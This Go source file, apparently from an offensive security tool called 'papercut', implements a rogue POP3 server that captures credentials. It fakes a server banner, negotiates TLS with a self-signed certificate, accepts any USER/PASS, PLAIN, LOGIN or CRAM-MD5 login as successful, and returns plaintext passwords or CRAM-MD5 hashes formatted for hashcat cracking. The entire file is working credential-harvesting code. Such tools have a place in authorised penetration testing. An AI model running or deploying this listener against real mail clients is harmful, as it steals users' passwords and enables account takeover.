package listener

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"papercut/internal/output"
)

// POP3Creds holds captured POP3 authentication credentials.
type POP3Creds struct {
	SourceIP   string
	Username   string
	Password   string // plaintext password (USER/PASS, PLAIN, LOGIN) or empty for CRAM-MD5
	AuthMethod string // "USER/PASS", "PLAIN", "LOGIN", "CRAM-MD5"
	Hash       string // CRAM-MD5 hash (hashcat mode 10200 format: $cram-md5$challenge$hash)
}

// ListenPOP3 starts a TCP listener on addr (host:port), waits for incoming
// POP3 connections and captures authentication credentials.
// Supports implicit TLS (client starts TLS handshake immediately), STLS (STARTTLS),
// and auth methods: USER/PASS, AUTH PLAIN, AUTH LOGIN, AUTH CRAM-MD5.
// Some POP3 clients probe first (CAPA→QUIT) then reconnect, so this accepts up to 3 connections.
func ListenPOP3(ctx context.Context, addr string, timeout time.Duration, verbose bool) (*POP3Creds, error) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		return nil, fmt.Errorf("listen on %s: %w", addr, err)
	}
	defer ln.Close()

	// Close listener when context is cancelled
	go func() {
		<-ctx.Done()
		ln.Close()
	}()

	// Set accept deadline based on timeout
	if tcpLn, ok := ln.(*net.TCPListener); ok {
		tcpLn.SetDeadline(time.Now().Add(timeout))
	}

	// Generate TLS config once for all connections
	tlsCfg, err := generateSelfSignedTLS()
	if err != nil {
		return nil, fmt.Errorf("generate TLS cert: %w", err)
	}

	for attempt := 0; attempt < 3; attempt++ {
		select {
		case <-ctx.Done():
			return nil, fmt.Errorf("cancelled while waiting for POP3 connection")
		default:
		}

		// After the first connection, use a short deadline for subsequent accepts.
		if attempt > 0 {
			if tcpLn, ok := ln.(*net.TCPListener); ok {
				tcpLn.SetDeadline(time.Now().Add(10 * time.Second))
			}
		}

		rawConn, err := ln.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return nil, fmt.Errorf("cancelled while waiting for POP3 connection")
			default:
				return nil, fmt.Errorf("no POP3 credentials captured (client probed but did not authenticate)")
			}
		}

		creds, err := handlePOP3Conn(rawConn, tlsCfg, timeout, verbose)
		rawConn.Close()

		if err == nil && creds != nil {
			return creds, nil
		}

		if verbose && err != nil {
			output.Info("POP3 connection %d ended without creds: %v", attempt+1, err)
		}
	}

	return nil, fmt.Errorf("no credentials captured after multiple POP3 connections")
}

// handlePOP3Conn handles a single POP3 connection. Detects implicit TLS (first byte 0x16)
// and upgrades before starting the POP3 protocol.
func handlePOP3Conn(rawConn net.Conn, tlsCfg *tls.Config, timeout time.Duration, verbose bool) (*POP3Creds, error) {
	sourceIP := rawConn.RemoteAddr().String()
	if host, _, err := net.SplitHostPort(sourceIP); err == nil {
		sourceIP = host
	}

	if verbose {
		output.Info("POP3 connection received from %s", sourceIP)
	}

	rawConn.SetReadDeadline(time.Now().Add(30 * time.Second))

	// Peek first byte to detect implicit TLS (0x16 = TLS ClientHello)
	buf := make([]byte, 1)
	n, err := rawConn.Read(buf)
	if err != nil || n == 0 {
		return nil, fmt.Errorf("failed to read first byte: %w", err)
	}

	var conn net.Conn

	if buf[0] == 0x16 {
		// Implicit TLS — client started TLS handshake immediately
		if verbose {
			output.Info("POP3 implicit TLS detected, performing handshake...")
		}

		// We already consumed the first byte, so we need to prepend it.
		// Use a prefixConn to feed it back to the TLS handshake.
		prefixed := &prefixConn{prefix: buf[:n], Conn: rawConn}
		tlsConn := tls.Server(prefixed, tlsCfg)
		tlsConn.SetDeadline(time.Now().Add(30 * time.Second))

		if err := tlsConn.Handshake(); err != nil {
			return nil, fmt.Errorf("implicit TLS handshake failed: %w", err)
		}

		if verbose {
			output.Info("POP3 TLS handshake complete")
		}

		conn = tlsConn
	} else {
		// Plaintext — prepend the consumed byte back
		conn = &prefixConn{prefix: buf[:n], Conn: rawConn}
	}

	reader := bufio.NewReader(conn)

	// Send POP3 banner
	conn.Write([]byte("+OK POP3 server ready\r\n"))

	creds := &POP3Creds{SourceIP: sourceIP}

	// CRAM-MD5 challenge
	cramChallenge := "<1234.5678@mail>"

	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			if creds.Username != "" && (creds.Password != "" || creds.Hash != "") {
				return creds, nil
			}
			return nil, fmt.Errorf("client disconnected before sending credentials")
		}

		line = strings.TrimRight(line, "\r\n")
		parts := strings.SplitN(line, " ", 2)
		cmd := strings.ToUpper(parts[0])

		if verbose {
			output.Info("POP3 < %s", line)
		}

		switch cmd {
		case "USER":
			if len(parts) > 1 {
				creds.Username = parts[1]
			}
			conn.Write([]byte("+OK\r\n"))

		case "PASS":
			if len(parts) > 1 {
				creds.Password = parts[1]
			}
			creds.AuthMethod = "USER/PASS"
			conn.Write([]byte("+OK Logged in\r\n"))
			return creds, nil

		case "CAPA":
			conn.Write([]byte("+OK Capability list follows\r\nTOP\r\nUIDL\r\nUSER\r\nSASL CRAM-MD5 PLAIN LOGIN\r\n.\r\n"))

		case "STLS", "STARTTLS":
			conn.Write([]byte("+OK Begin TLS negotiation\r\n"))

			tlsConn := tls.Server(conn, tlsCfg)
			tlsConn.SetDeadline(time.Now().Add(30 * time.Second))

			if err := tlsConn.Handshake(); err != nil {
				if verbose {
					output.Info("POP3 STLS: TLS handshake failed: %v", err)
				}
				return nil, fmt.Errorf("TLS handshake failed: %w", err)
			}

			if verbose {
				output.Info("POP3 STLS: TLS negotiated")
			}

			conn = tlsConn
			reader = bufio.NewReader(conn)

		case "AUTH":
			if len(parts) < 2 {
				conn.Write([]byte("-ERR missing auth mechanism\r\n"))
				continue
			}
			authParts := strings.SplitN(parts[1], " ", 2)
			mechanism := strings.ToUpper(authParts[0])

			switch mechanism {
			case "CRAM-MD5":
				// Send challenge
				challengeB64 := base64.StdEncoding.EncodeToString([]byte(cramChallenge))
				conn.Write([]byte("+ " + challengeB64 + "\r\n"))

				if verbose {
					output.Info("POP3 CRAM-MD5 challenge sent: %s", cramChallenge)
				}

				// Read response: base64(username SPACE hmac-md5-hex)
				respLine, err := reader.ReadString('\n')
				if err != nil {
					return nil, fmt.Errorf("client disconnected during AUTH CRAM-MD5")
				}
				respLine = strings.TrimRight(respLine, "\r\n")

				if verbose {
					output.Info("POP3 < %s", respLine)
				}

				decoded := pop3DecodeBase64(respLine)
				// Format: "username hash"
				spaceIdx := strings.LastIndex(decoded, " ")
				if spaceIdx > 0 {
					creds.Username = decoded[:spaceIdx]
					hash := decoded[spaceIdx+1:]
					creds.Hash = fmt.Sprintf("$cram-md5$%s$%s", cramChallenge, hash)
				}

				creds.AuthMethod = "CRAM-MD5"
				conn.Write([]byte("+OK Logged in\r\n"))
				return creds, nil

			case "PLAIN":
				if len(authParts) > 1 {
					decoded := pop3DecodeBase64(authParts[1])
					plainParts := strings.SplitN(decoded, "\x00", 3)
					if len(plainParts) == 3 {
						creds.Username = plainParts[1]
						creds.Password = plainParts[2]
					}
					creds.AuthMethod = "PLAIN"
					conn.Write([]byte("+OK Logged in\r\n"))
					return creds, nil
				}
				conn.Write([]byte("+ \r\n"))
				authLine, err := reader.ReadString('\n')
				if err != nil {
					return nil, fmt.Errorf("client disconnected during AUTH PLAIN")
				}
				decoded := pop3DecodeBase64(strings.TrimRight(authLine, "\r\n"))
				plainParts := strings.SplitN(decoded, "\x00", 3)
				if len(plainParts) == 3 {
					creds.Username = plainParts[1]
					creds.Password = plainParts[2]
				}
				creds.AuthMethod = "PLAIN"
				conn.Write([]byte("+OK Logged in\r\n"))
				return creds, nil

			case "LOGIN":
				conn.Write([]byte("+ VXNlcm5hbWU6\r\n"))
				userLine, err := reader.ReadString('\n')
				if err != nil {
					return nil, fmt.Errorf("client disconnected during AUTH LOGIN")
				}
				creds.Username = pop3DecodeBase64(strings.TrimRight(userLine, "\r\n"))
				conn.Write([]byte("+ UGFzc3dvcmQ6\r\n"))
				passLine, err := reader.ReadString('\n')
				if err != nil {
					return nil, fmt.Errorf("client disconnected during AUTH LOGIN")
				}
				creds.Password = pop3DecodeBase64(strings.TrimRight(passLine, "\r\n"))
				creds.AuthMethod = "LOGIN"
				conn.Write([]byte("+OK Logged in\r\n"))
				return creds, nil

			default:
				conn.Write([]byte("-ERR unsupported auth mechanism\r\n"))
			}

		case "QUIT":
			conn.Write([]byte("+OK Bye\r\n"))
			if creds.Username != "" {
				return creds, nil
			}
			return nil, fmt.Errorf("client quit before sending credentials")

		default:
			conn.Write([]byte("-ERR unknown command\r\n"))
		}
	}
}

// prefixConn wraps a net.Conn and prepends already-consumed bytes to the read stream.
// Used when we peek the first byte to detect implicit TLS.
type prefixConn struct {
	prefix []byte
	net.Conn
}

func (c *prefixConn) Read(b []byte) (int, error) {
	if len(c.prefix) > 0 {
		n := copy(b, c.prefix)
		c.prefix = c.prefix[n:]
		return n, nil
	}
	return c.Conn.Read(b)
}

// pop3DecodeBase64 decodes a base64 string, returning the raw string on error.
func pop3DecodeBase64(s string) string {
	decoded, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return s
	}
	return string(decoded)
}
